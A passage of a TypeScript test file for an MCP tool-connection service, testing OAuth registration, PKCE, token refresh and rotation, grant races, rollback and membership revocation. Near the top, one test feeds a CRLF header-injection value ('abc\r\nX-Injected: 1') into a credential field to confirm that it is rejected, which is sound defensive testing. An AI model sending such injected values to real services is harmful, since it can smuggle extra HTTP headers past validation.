    })).rejects.toMatchObject({ status: 400 });

    await expect(service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture split header",
      credentialValues: { "headers.X-Api-Key": "abc\r\nX-Injected: 1" },
    })).rejects.toMatchObject({ status: 400 });

    // Nothing partial survived either rejection.
    await expect(db.select().from(toolConnections)).resolves.toHaveLength(0);
    await expect(db.select().from(companySecrets)).resolves.toHaveLength(0);
  });

  it("registers dynamically for an unknown OAuth endpoint and completes the flow", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture OAuth" });
    // Discovery succeeded, so the wizard gets a real sign-in branch rather than
    // an error, and it already knows which server it is about to trust.
    expect(connected.auth).toMatchObject({ kind: "oauth", issuer: ISSUER, resource: MCP_URL });

    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(start.registrationSource).toBe("dcr");
    expect(start.issuer).toBe(ISSUER);

    const registration = fixture.requestsTo("/register");
    expect(registration).toHaveLength(1);
    expect(registration[0]!.body).toMatchObject({
      redirect_uris: [REDIRECT_URI],
      token_endpoint_auth_method: "none",
      application_type: "web",
    });

    const authorizationUrl = new URL(start.authorizationUrl);
    expect(authorizationUrl.origin + authorizationUrl.pathname).toBe(`${ISSUER}/authorize`);
    expect(authorizationUrl.searchParams.get("client_id")).toBe("fixture-dcr-client");
    expect(authorizationUrl.searchParams.get("code_challenge_method")).toBe("S256");
    expect(authorizationUrl.searchParams.get("code_challenge")).toBeTruthy();
    // RFC 8707: the MCP server is named so the token can be audience-restricted.
    expect(authorizationUrl.searchParams.get("resource")).toBe(MCP_URL);

    const [afterStart] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    expect(afterStart!.authKind).toBe("oauth");
    expect(afterStart!.config).toMatchObject({
      oauth: { issuer: ISSUER, expectedIssuer: ISSUER, resource: MCP_URL, clientRegistrationSource: "dcr" },
    });

    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    const completed = await service.completeOAuthCallback({
      state: authorizationUrl.searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    // Same catalog/review pipeline a curated connection gets.
    expect(completed.actions.readOnly.map((action) => action.toolName)).toEqual(["list_insights"]);
    expect(completed.actions.canMakeChanges.map((action) => action.toolName)).toEqual(["create_insight"]);

    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("resource")).toBe(MCP_URL);
    expect((tokenRequest.body as URLSearchParams).get("code_verifier")).toBeTruthy();

    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
    expect(connection).toMatchObject({ status: "active", enabled: true, authKind: "oauth" });
    // The access token lives in a secret, never in the config JSON.
    expect(JSON.stringify(connection!.config)).not.toContain("fixture-access-");
    expect(connection!.credentialSecretRefs.map((ref) => ref.configPath).sort())
      .toEqual(["oauth.access_token", "oauth.refresh_token"]);
  });

  async function approveFixtureAuthorization(authorizationUrl: string) {
    const url = new URL(authorizationUrl);
    const consent = await fetch(url);
    expect(consent.status).toBe(200);
    expect(await consent.text()).toContain("Connect the test MCP server");
    const body = new URLSearchParams(url.search);
    body.set("decision", "allow");
    const response = await fetch(url, { method: "POST", body, redirect: "manual" });
    expect(response.status).toBe(302);
    return new URL(response.headers.get("location")!);
  }

  async function expireFixtureCredentials(connectionId: string) {
    const expiredAt = new Date(Date.now() - 1000).toISOString();
    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connectionId));
    const config = { ...connection!.config, oauth: { ...connection!.config.oauth as object, expiresAt: expiredAt } };
    await db.update(toolConnections).set({ config, transportConfig: config }).where(eq(toolConnections.id, connectionId));
    const grants = await db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, connectionId));
    for (const grant of grants) {
      await db.update(connectionGrants).set({
        providerTenant: { ...grant.providerTenant, oauth: { ...grant.providerTenant?.oauth as object, accessTokenExpiresAt: expiredAt } },
      }).where(eq(connectionGrants.id, grant.id));
    }
  }

  it.each(["organization", "user"] as const)("keeps a real %s MCP connection usable across offline-access token expiry and rotation", async (grantKind) => {
    const fixture = await startOAuthRefreshFixture();
    try {
      const company = await createCompany(db);
      const app = createRouteApp(db, { deploymentMode: "local_trusted", deploymentExposure: "private" });
      const redirectUri = "http://127.0.0.1:3100/api/tools/oauth/callback";
      vi.stubEnv("PAPERCLIP_PUBLIC_URL", "http://127.0.0.1:3100");
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const connected = await request(app).post(`/api/companies/${company.id}/tools/apps/connect`)
        .send({ link: fixture.mcpUrl, name: "Offline access MCP", grantKind }).expect(201);
      const connectionId = connected.body.connectionId;
      const start = await request(app).post(`/api/tools/oauth/${connectionId}/start`)
        .send(grantKind === "user" ? { asCurrentUser: true } : {}).expect(200);
      const callback = await approveFixtureAuthorization(start.body.authorizationUrl);
      await toolAccessService(db).completeOAuthCallback({
        state: callback.searchParams.get("state")!, code: callback.searchParams.get("code")!,
        iss: callback.searchParams.get("iss")!, redirectUri, actor,
      });
      const service = toolAccessService(db);
      const [agent] = await db.insert(agents).values({ companyId: company.id, name: "Offline access reader", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {} }).returning();
      const catalog = await service.refreshCatalog(connectionId, actor);
      await service.finishGalleryAppConnection(company.id, connectionId, {
        enabledCatalogEntryIds: catalog.catalog.map((entry) => entry.id), askFirstCatalogEntryIds: [], access: { agentIds: [agent!.id] },
      }, actor);
      const call = () => createToolGatewayService(db).executeTestCall({
        companyId: company.id, connectionId, agentId: agent!.id, userId: "board-user", toolName: "read_status", parameters: {},
      });
      const successfulCall = { decision: "allowed", result: { data: { content: [{ type: "text", text: "Authenticated MCP call succeeded" }] } } };
      await expect(call()).resolves.toMatchObject(successfulCall);
      // The provider actually rejects its old access token. Expire Paperclip's
      // cached timestamp too, without waiting an hour or mocking global time.
      for (let rotation = 0; rotation < 2; rotation += 1) {
        fixture.advanceTime(3_601_000);
        await expireFixtureCredentials(connectionId);
        await expect(service.refreshCatalog(connectionId, actor)).resolves.toMatchObject({ catalog: [expect.objectContaining({ toolName: "read_status" })] });
        await expect(call()).resolves.toMatchObject(successfulCall);
      }
      expect(fixture.events.filter((event) => event.kind === "registration")).toHaveLength(1);
      expect(fixture.events.filter((event) => event.kind === "authorization")).toEqual([
        { kind: "authorization", scopes: ["mcp:read", "offline_access"], prompt: "consent", offline: true },
      ]);
      expect(fixture.events.filter((event) => event.kind === "token").map((event) => event.grantType))
        .toEqual(["authorization_code", "refresh_token", "refresh_token"]);
      const state = await service.getConnection(connectionId, company.id);
      expect(JSON.stringify(state)).not.toMatch(/fixture-(access|refresh)-/);
    } finally { await fixture.close(); }
  });

  it.each([
    { challengeScope: false, resourceScopes: ["mcp:read"], requestedScopes: undefined },
    { challengeScope: false, resourceScopes: [], requestedScopes: ["mcp:read"] },
  ])("adds only offline access to generic discovery scopes ($resourceScopes)", async (options) => {
    const fixture = await startOAuthRefreshFixture(options);
    try {
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const connected = await service.connectGalleryApp(company.id, { link: fixture.mcpUrl });
      // Explicit scope overrides must still get refresh capability, and must
      // remain the saved scope set used by reconnect and callback persistence.
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const input = { redirectUri: "http://127.0.0.1:3100/api/tools/oauth/callback", actor, scopes: options.requestedScopes };
      const start = await service.startOAuth(company.id, connected.connectionId, input);
      expect(new URL(start.authorizationUrl).searchParams.get("scope")).toBe("mcp:read offline_access");
      const saved = await service.getConnection(connected.connectionId, company.id);
      expect(saved.config.oauth).toMatchObject({ scopes: ["mcp:read", "offline_access"] });
      const callback = await approveFixtureAuthorization(start.authorizationUrl);
      const completed = await service.completeOAuthCallback({
        state: callback.searchParams.get("state")!, code: callback.searchParams.get("code")!,
        iss: callback.searchParams.get("iss")!, redirectUri: input.redirectUri, actor,
      });
      expect(completed.connection.config.oauth).toMatchObject({ scopes: ["mcp:read", "offline_access"] });
      const grants = await db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, connected.connectionId));
      expect(grants).toHaveLength(1);
      expect(grants[0].providerTenant?.oauth).toMatchObject({
        requestedScopes: ["mcp:read", "offline_access"],
        scopes: ["mcp:read", "offline_access"],
        scopeSource: "provider",
        unrequestedScopes: [],
      });
      const reconnect = await service.startOAuth(company.id, connected.connectionId, { redirectUri: input.redirectUri, actor });
      expect(new URL(reconnect.authorizationUrl).searchParams.get("scope")).toBe("mcp:read offline_access");
    } finally { await fixture.close(); }
  });

  it.each([
    { supportsOfflineAccess: false },
    { grantTypes: ["authorization_code"] },
  ])("does not request offline access when the authorization server does not support refresh ($supportsOfflineAccess, $grantTypes)", async (options) => {
    const fixture = await startOAuthRefreshFixture(options);
    try {
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const connected = await service.connectGalleryApp(company.id, { link: fixture.mcpUrl });
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: "http://127.0.0.1:3100/api/tools/oauth/callback", actor: { actorType: "user", actorId: "board-user" },
      });
      const url = new URL(start.authorizationUrl);
      expect(url.searchParams.get("scope")).toBe("mcp:read");
      expect(url.searchParams.has("prompt")).toBe(false);
      const callback = await approveFixtureAuthorization(start.authorizationUrl);
      expect(callback.searchParams.has("code")).toBe(true);
      expect(fixture.events.find((event) => event.kind === "authorization").offline).toBe(false);
      const completed = await service.completeOAuthCallback({
        state: callback.searchParams.get("state")!, code: callback.searchParams.get("code")!,
        iss: callback.searchParams.get("iss")!, redirectUri: "http://127.0.0.1:3100/api/tools/oauth/callback",
        actor: { actorType: "user", actorId: "board-user" },
      });
      expect(completed.connection.status).toBe("active");
      expect(completed.connection.credentialSecretRefs.some((ref) => ref.configPath === "oauth.access_token")).toBe(true);
      expect(completed.connection.credentialSecretRefs.some((ref) => ref.configPath === "oauth.refresh_token")).toBe(false);
    } finally { await fixture.close(); }
  });

  it.each([
    { name: "different authorization endpoint", authorizationUrl: `${ISSUER}/other-authorize`, tokenUrl: `${ISSUER}/token`, issuer: ISSUER, offline: false },
    { name: "different token endpoint", authorizationUrl: `${ISSUER}/authorize`, tokenUrl: `${ISSUER}/other-token`, issuer: ISSUER, offline: false },
    { name: "different issuer", authorizationUrl: `${ISSUER}/authorize`, tokenUrl: `${ISSUER}/token`, issuer: `${MCP_ORIGIN}/tenant/other`, offline: false },
    { name: "matching endpoints and issuer", authorizationUrl: `${ISSUER}/authorize`, tokenUrl: `${ISSUER}/token`, issuer: ISSUER, offline: true },
  ])("binds offline support to the selected OAuth server: $name", async (candidate) => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const originalFetch = fixture.fetchMock.getMockImplementation()!;
    fixture.fetchMock.mockImplementation(async (url, init) => {
      const href = String(url);
      if (href === `${MCP_ORIGIN}/.well-known/oauth-protected-resource/mcp`) {
        return jsonResponse({
          resource: MCP_URL, issuer: ISSUER, authorization_servers: [candidate.issuer],
          authorization_endpoint: `${ISSUER}/authorize`, token_endpoint: `${ISSUER}/token`,
          registration_endpoint: `${ISSUER}/register`, scopes_supported: ["mcp:read"],
          code_challenge_methods_supported: ["S256"], token_endpoint_auth_methods_supported: ["none"],
        });
      }
      const issuerPath = new URL(candidate.issuer).pathname;
      if (href === `${MCP_ORIGIN}/.well-known/oauth-authorization-server${issuerPath}`) {
        return jsonResponse({
          issuer: candidate.issuer, authorization_endpoint: candidate.authorizationUrl,
          token_endpoint: candidate.tokenUrl, scopes_supported: ["mcp:read", "offline_access"],
          grant_types_supported: ["authorization_code", "refresh_token"],
        });
      }
      return originalFetch(url, init);
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI, actor: { actorType: "user", actorId: "board-user" },
    });
    const url = new URL(start.authorizationUrl);
    expect(url.origin + url.pathname).toBe(`${ISSUER}/authorize`);
    expect(url.searchParams.get("scope")).toBe(candidate.offline ? "mcp:read offline_access" : "mcp:read");
    expect(url.searchParams.get("prompt")).toBe(candidate.offline ? "consent" : null);
  });

  it("discovers offline refresh support when reconnecting a legacy connection with cached endpoints", async () => {
    const fixture = await startOAuthRefreshFixture();
    try {
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const connected = await service.connectGalleryApp(company.id, { link: fixture.mcpUrl });
      const input = { redirectUri: "http://127.0.0.1:3100/api/tools/oauth/callback", actor: { actorType: "user" as const, actorId: "board-user" } };
      await service.startOAuth(company.id, connected.connectionId, input);
      const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
      const oauth = { ...connection!.config.oauth as Record<string, unknown>, scopes: ["mcp:read"] };
      delete oauth.offlineAccessSupported;
      delete oauth.grantTypesSupported;
      const config = { ...connection!.config, oauth };
      await db.update(toolConnections).set({ config, transportConfig: config }).where(eq(toolConnections.id, connected.connectionId));
      const reconnect = await service.startOAuth(company.id, connected.connectionId, input);
      const url = new URL(reconnect.authorizationUrl);
      expect(url.searchParams.get("scope")).toBe("mcp:read offline_access");
      expect(url.searchParams.get("prompt")).toBe("consent");
      expect(fixture.events.filter((event) => event.kind === "registration")).toHaveLength(1);
    } finally { await fixture.close(); }
  });

  it("discovers OAuth for a personal URL connection before its user grant exists", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const app = createRouteApp(db);
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({
        link: MCP_URL,
        name: "Fixture personal OAuth",
        grantKind: "user",
      });
    expect(response.status, JSON.stringify(response.body)).toBe(201);
    const connected = response.body;

    expect(connected.auth).toMatchObject({
      kind: "oauth",
      issuer: ISSUER,
      resource: MCP_URL,
      startUrl: expect.any(String),
    });
    expect(fixture.requestsTo("/mcp")[0]!.headers.authorization).toBeUndefined();
    await expect(
      db
        .select()
        .from(connectionGrants)
        .where(eq(connectionGrants.connectionId, connected.connectionId)),
    ).resolves.toHaveLength(0);

    const authorizationUrl = new URL(connected.auth.startUrl);
    const code = fixture.issueAuthorizationCode(connected.auth.startUrl);
    await request(app)
      .get("/api/tools/oauth/callback")
      .set("Accept", "text/html")
      .query({ state: authorizationUrl.searchParams.get("state")!, code, iss: ISSUER })
      .expect(303);

    const grants = await db
      .select()
      .from(connectionGrants)
      .where(eq(connectionGrants.connectionId, connected.connectionId));
    expect(grants).toEqual([
      expect.objectContaining({
        kind: "user",
        subjectUserId: actor.actorId,
        status: "active",
      }),
    ]);
  });

  it("does not let another user take over an archived personal URL connection", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const input = { link: MCP_URL, name: "Archived personal URL", grantKind: "user" as const };
    const first = await service.connectGalleryApp(company.id, input, { actorType: "user", actorId: "board-user" });
    await db.update(toolConnections).set({ status: "archived" }).where(eq(toolConnections.id, first.connectionId));
    await db.update(toolApplications).set({ status: "archived" }).where(eq(toolApplications.id, first.application.id));
    await db.insert(companyMemberships).values({
      companyId: company.id, principalType: "user", principalId: "other-user", status: "active", membershipRole: "admin",
    });
    fixture.fetchMock.mockClear();

    await expect(service.connectGalleryApp(company.id, input, {
      actorType: "user", actorId: "other-user",
    })).rejects.toMatchObject({ status: 403, message: "Only the existing personal identity can reconnect this connection" });

    expect(fixture.fetchMock).not.toHaveBeenCalled();
    await expect(db.select().from(connectionGrants)).resolves.toHaveLength(0);
    await expect(service.getConnection(first.connectionId)).resolves.toMatchObject({
      status: "archived", createdByUserId: "board-user",
    });
    const resumed = await service.connectGalleryApp(company.id, input, { actorType: "user", actorId: "board-user" });
    expect(resumed.connectionId).toBe(first.connectionId);
    expect(resumed.auth).toMatchObject({ kind: "oauth" });
  });

  it("creates one personal grant when two public URL setup retries probe concurrently", async () => {
    const fixture = installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const first = await service.connectGalleryApp(company.id, {
      link: MCP_URL, name: "Concurrent personal URL", grantKind: "user",
    }, actor);
    await service.connectGalleryApp(company.id, {
      link: MCP_URL, grantKind: "user", resumeConnectionId: first.connectionId,
    }, actor);
    // Model an interrupted draft with catalog/defaults but no personal grant.
    // This isolates the grant race from first-time catalog/profile insertion.
    await db.delete(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId));
    await db.delete(toolAccessAuditEvents).where(eq(toolAccessAuditEvents.connectionId, first.connectionId));
    fixture.fetchMock.mockRestore();
    let probes = 0;
    let release!: () => void;
    const bothProbed = new Promise<void>((resolve) => { release = resolve; });
    vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
      probes += 1;
      if (probes === 2) release();
      await bothProbed;
      return jsonResponse({ jsonrpc: "2.0", id: "paperclip-catalog-refresh", result: { tools: FIXTURE_TOOLS } });
    });

    const results = await Promise.allSettled([0, 1].map(() => service.connectGalleryApp(company.id, {
      link: MCP_URL, grantKind: "user", resumeConnectionId: first.connectionId,
    }, actor)));

    for (const result of results) {
      if (result.status === "rejected") throw result.reason;
    }
    expect(results.map((result) => result.status)).toEqual(["fulfilled", "fulfilled"]);
    await expect(db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId)))
      .resolves.toEqual([expect.objectContaining({ kind: "user", subjectUserId: actor.actorId, status: "active", credentialSecretRefs: [] })]);
    await expect(db.select().from(toolAccessAuditEvents).where(and(
      eq(toolAccessAuditEvents.connectionId, first.connectionId),
      eq(toolAccessAuditEvents.action, "connection_grant.created"),
    ))).resolves.toHaveLength(1);
  });

  it("keeps a successful personal setup when the grant-creating retry later fails", async () => {
    const fixture = installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const first = await service.connectGalleryApp(company.id, {
      link: MCP_URL, name: "Personal retry rollback", grantKind: "user",
    }, actor);
    const retryInput = { link: MCP_URL, grantKind: "user" as const, resumeConnectionId: first.connectionId };
    await service.connectGalleryApp(company.id, retryInput, actor);
    await db.delete(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId));
    await db.update(toolConnections).set({ status: "archived" }).where(eq(toolConnections.id, first.connectionId));
    await db.update(toolApplications).set({ status: "archived", archivedAt: new Date() }).where(eq(toolApplications.id, first.application.id));
    fixture.fetchMock.mockRestore();
    let calls = 0;
    let catalogStarted!: () => void;
    const catalogPending = new Promise<void>((resolve) => { catalogStarted = resolve; });
    let failCatalog!: () => void;
    const releaseCatalog = new Promise<void>((resolve) => { failCatalog = resolve; });
    vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
      calls += 1;
      if (calls === 2) {
        // The first retry has created its grant but has not finished setup.
        catalogStarted();
        await releaseCatalog;
        throw new Error("first retry catalog unavailable");
      }
      return jsonResponse({ jsonrpc: "2.0", id: "paperclip-catalog-refresh", result: { tools: FIXTURE_TOOLS } });
    });
    const failure = service.connectGalleryApp(company.id, {
      link: MCP_URL, name: "Personal retry rollback", grantKind: "user",
    }, actor).then(() => null, (error: unknown) => error);
    await Promise.race([catalogPending, failure.then((error) => { throw error ?? new Error("Retry finished before the catalog probe"); })]);
    try {
      const successfulRetry = await service.connectGalleryApp(company.id, retryInput, actor);
      expect(successfulRetry.connectionId).toBe(first.connectionId);
    } finally {
      failCatalog();
    }
    expect(await failure).toMatchObject({ status: 502 });
    await expect(db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId)))
      .resolves.toEqual([expect.objectContaining({ kind: "user", subjectUserId: actor.actorId, status: "active", credentialSecretRefs: [] })]);
    await expect(service.getConnection(first.connectionId)).resolves.toMatchObject({ status: "draft", credentialPolicy: "per_user" });
    const [application] = await db.select().from(toolApplications).where(eq(toolApplications.id, first.application.id));
    expect(application.status).toBe("draft");
    await expect(service.checkHealth(first.connectionId, actor)).resolves.toMatchObject({ connection: { healthStatus: "ok" } });
  });

  it("rolls back partial catalog and profile writes without removing the established public identity", async () => {
    const fixture = installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    const input = { link: MCP_URL, name: "Personal atomic catalog", grantKind: "user" as const };
    const first = await service.connectGalleryApp(company.id, input, actor);
    const catalogBefore = await db.select().from(toolCatalogEntries).where(eq(toolCatalogEntries.connectionId, first.connectionId));
    await db.delete(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId));
    await db.update(toolConnections).set({ status: "archived" }).where(eq(toolConnections.id, first.connectionId));
    await db.update(toolApplications).set({ status: "archived", archivedAt: new Date() }).where(eq(toolApplications.id, first.application.id));
    fixture.fetchMock.mockRestore();
    vi.spyOn(globalThis, "fetch").mockImplementation(async () => jsonResponse({
      jsonrpc: "2.0", id: "paperclip-catalog-refresh",
      result: { tools: [...FIXTURE_TOOLS, { name: "new_tool", description: "Partial catalog addition" }] },
    }));
    await db.execute(sql`
      CREATE FUNCTION test_personal_profile_failure() RETURNS trigger LANGUAGE plpgsql AS $$
      BEGIN RAISE EXCEPTION 'personal profile fixture failure'; END $$
    `);
    await db.execute(sql`
      CREATE TRIGGER test_personal_profile_failure BEFORE INSERT ON tool_profile_entries
      FOR EACH ROW EXECUTE FUNCTION test_personal_profile_failure()
    `);
    try {
      await expect(service.connectGalleryApp(company.id, input, actor)).rejects.toThrow();
      await expect(db.select().from(toolCatalogEntries).where(eq(toolCatalogEntries.connectionId, first.connectionId)))
        .resolves.toEqual(catalogBefore);
      await expect(db.select().from(toolProfiles).where(eq(toolProfiles.companyId, company.id))).resolves.toHaveLength(0);
      await expect(db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).resolves.toHaveLength(0);
      await expect(db.select().from(connectionGrants).where(eq(connectionGrants.connectionId, first.connectionId)))
        .resolves.toEqual([expect.objectContaining({ kind: "user", status: "active", credentialSecretRefs: [] })]);
      await expect(service.getConnection(first.connectionId)).resolves.toMatchObject({ status: "draft", credentialPolicy: "per_user" });
    } finally {
      await db.execute(sql`DROP TRIGGER test_personal_profile_failure ON tool_profile_entries`);
      await db.execute(sql`DROP FUNCTION test_personal_profile_failure()`);
    }
    const retry = await service.connectGalleryApp(company.id, { ...input, resumeConnectionId: first.connectionId }, actor);
    expect(retry.catalog).toHaveLength(3);
    await expect(db.select().from(toolProfiles).where(eq(toolProfiles.companyId, company.id))).resolves.toHaveLength(1);
    await expect(db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).resolves.toHaveLength(1);
  });

  it("creates an empty user grant after a personal public URL probe succeeds", async () => {
    // Use a real loopback MCP server here: neither fetch nor the transport is mocked.
    const receivedMethods: string[] = [];
    const mcpServer = createServer(async (req, res) => {
      const chunks: Buffer[] = [];
      for await (const chunk of req) chunks.push(Buffer.from(chunk));
      const body = JSON.parse(Buffer.concat(chunks).toString("utf8"));
      receivedMethods.push(body.method);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ jsonrpc: "2.0", id: body.id, result: { tools: FIXTURE_TOOLS } }));
    });
    mcpServer.listen(0, "127.0.0.1");
    await once(mcpServer, "listening");
    const address = mcpServer.address();
    if (!address || typeof address === "string") throw new Error("Missing MCP fixture port");
    try {
      const company = await createCompany(db);
      const app = createRouteApp(db, {
        deploymentMode: "local_trusted",
        deploymentExposure: "private",
      });
      const actor = { actorType: "user" as const, actorId: "board-user" };

      const response = await request(app)
        .post(`/api/companies/${company.id}/tools/apps/connect`)
        .send({
          link: `http://127.0.0.1:${address.port}/mcp`,
          name: "Fixture personal public",
          grantKind: "user",
        });
      expect(response.status, JSON.stringify(response.body)).toBe(201);
      const connected = response.body;
      expect(receivedMethods).toContain("tools/list");

      expect(connected.connection).toMatchObject({
        status: "draft",
        credentialPolicy: "per_user",
      });
      expect(connected.catalog.map((entry: { toolName: string }) => entry.toolName).sort()).toEqual([
        "create_insight",
        "list_insights",
      ]);
      await expect(
        db
          .select()
          .from(connectionGrants)
          .where(eq(connectionGrants.connectionId, connected.connectionId)),
      ).resolves.toEqual([
        expect.objectContaining({
          kind: "user",
          subjectUserId: actor.actorId,
          credentialSecretRefs: [],
          status: "active",
        }),
      ]);
    } finally {
      await new Promise<void>((resolve, reject) => {
        mcpServer.close((error) => error ? reject(error) : resolve());
        mcpServer.closeAllConnections();
      });
    }
  });

  it("completes organization OAuth with a single database connection", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const callbackDb = createDb(tempDb!.connectionString, { maxConnections: 1 });
    const service = toolAccessService(callbackDb);
    let deadline: ReturnType<typeof setTimeout> | null = null;

    try {
      await callbackDb.execute(sql`select pg_backend_pid()`);
      const connected = await service.connectGalleryApp(company.id, {
        link: MCP_URL,
        name: "Fixture single-pool OAuth",
      });
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      });
      const authorizationUrl = new URL(start.authorizationUrl);
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      const completed = await Promise.race([
        service.completeOAuthCallback({
          state: authorizationUrl.searchParams.get("state")!,
          code,
          iss: ISSUER,
          redirectUri: REDIRECT_URI,
          actor: { actorType: "user", actorId: "board-user" },
        }),
        new Promise<never>((_resolve, reject) => {
          deadline = setTimeout(() => {
            void callbackDb.$client.end({ timeout: 0 })
              .finally(() => reject(new Error("OAuth callback self-deadlocked with maxConnections=1")));
          }, 5_000);
        }),
      ]);

      expect(completed.connection).toMatchObject({ status: "active", enabled: true });
    } finally {
      if (deadline) clearTimeout(deadline);
      await callbackDb.$client.end({ timeout: 0 }).catch(() => undefined);
    }
  }, 15_000);

  it("rejects organization OAuth completion after the initiating user loses write access", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture revoked organization OAuth",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    await db
      .update(companyMemberships)
      .set({ membershipRole: "viewer" })
      .where(eq(companyMemberships.companyId, company.id));

    const authorizationUrl = new URL(start.authorizationUrl);
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await expect(service.completeOAuthCallback({
      state: authorizationUrl.searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor,
    })).rejects.toMatchObject({
      status: 403,
      message: expect.stringContaining("membership no longer permits connection changes"),
    });

    const [connection] = await db
      .select()
      .from(toolConnections)
      .where(eq(toolConnections.id, connected.connectionId));
    expect(connection).toMatchObject({ status: "draft" });
    expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.access_token")).toBe(false);
    expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.refresh_token")).toBe(false);
  });

  it("serializes organization OAuth completion behind membership revocation", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const callbackDb = createDb(tempDb!.connectionString, { maxConnections: 1 });
    const removalDb = createDb(tempDb!.connectionString, { maxConnections: 1 });
    const service = toolAccessService(callbackDb);
    const actor = { actorType: "user" as const, actorId: "board-user" };
    let releaseRemoval!: () => void;
    const removalMayCommit = new Promise<void>((resolve) => {
      releaseRemoval = resolve;
    });
    let membershipLocked!: () => void;
    const membershipIsLocked = new Promise<void>((resolve) => {
      membershipLocked = resolve;
    });

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture concurrent revocation OAuth",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    const authorizationUrl = new URL(start.authorizationUrl);
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    const beforeSecrets = await db.select().from(companySecrets).where(eq(companySecrets.companyId, company.id));
    const beforeVersions = await db.select().from(companySecretVersions);
    const beforeBindings = await db.select().from(companySecretBindings).where(eq(companySecretBindings.companyId, company.id));
    const beforeGrants = await db.select().from(connectionGrants).where(and(
      eq(connectionGrants.companyId, company.id),
      eq(connectionGrants.connectionId, connected.connectionId),
    ));

    const removal = removalDb.transaction(async (tx) => {
      await tx.select({ id: companyMemberships.id }).from(companyMemberships).where(and(
        eq(companyMemberships.companyId, company.id),
        eq(companyMemberships.principalType, "user"),
        eq(companyMemberships.principalId, "board-user"),
      )).for("update");
      membershipLocked();
      await removalMayCommit;
      await tx.update(companyMemberships).set({
        membershipRole: "viewer",
        updatedAt: new Date(),
      }).where(and(
        eq(companyMemberships.companyId, company.id),
        eq(companyMemberships.principalType, "user"),
        eq(companyMemberships.principalId, "board-user"),
      ));
    });

    await membershipIsLocked;
    const completion = service.completeOAuthCallback({
      state: authorizationUrl.searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor,
    }).then(
      (value) => ({ value, error: null }),
      (error: unknown) => ({ value: null, error }),
    );

    try {
      expect(await waitForBlockedMembershipUpdate()).toBe(true);
      releaseRemoval();
      await removal;
      const outcome = await completion;
      expect(outcome.value).toBeNull();
      expect(outcome.error).toMatchObject({
        status: 403,
